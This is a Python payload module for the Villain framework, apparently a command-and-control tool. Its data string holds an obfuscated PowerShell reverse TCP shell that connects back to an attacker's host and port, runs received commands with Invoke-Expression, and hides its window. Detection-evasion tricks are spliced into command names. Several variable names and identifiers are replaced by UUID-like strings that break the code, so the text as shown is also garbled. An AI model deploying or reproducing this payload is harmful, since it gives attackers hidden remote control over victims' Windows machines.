# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$bc31af0dd-81fd-4a9e-bce6-e3a6770814ae = New-Object System.Net.Sockets.TCPbc31af0dd-81fd-4a9e-bce6-e3a6770814ae('*LHOST*',*LPORT*);$sa26866e5d-77d9-4273-915a-934b77a9de0b =$bc31af0dd-81fd-4a9e-bce6-e3a6770814ae.Getsa26866e5d-77d9-4273-915a-934b77a9de0b();[byte[]]$a26866e5d-77d9-4273-915a-934b77a9de0b= 0..65535|%{0};while(($i = $sa26866e5d-77d9-4273-915a-934b77a9de0b.Read($a26866e5d-77d9-4273-915a-934b77a9de0b, 0, $a26866e5d-77d9-4273-915a-934b77a9de0b.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($a26866e5d-77d9-4273-915a-934b77a9de0b,0, $i);$sendback = (I"e"x"" $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p"w"d"").Path + '> ';$sendbyte = ([text.encoding]::ASCII).Geta26866e5d-77d9-4273-915a-934b77a9de0b($sendback2);$sa26866e5d-77d9-4273-915a-934b77a9de0b.Write($sendbyte,0,$sendbyte.Length);$sa26866e5d-77d9-4273-915a-934b77a9de0b.Flush()};$bc31af0dd-81fd-4a9e-bce6-e3a6770814ae.Close()} -WindowStyle Hidden"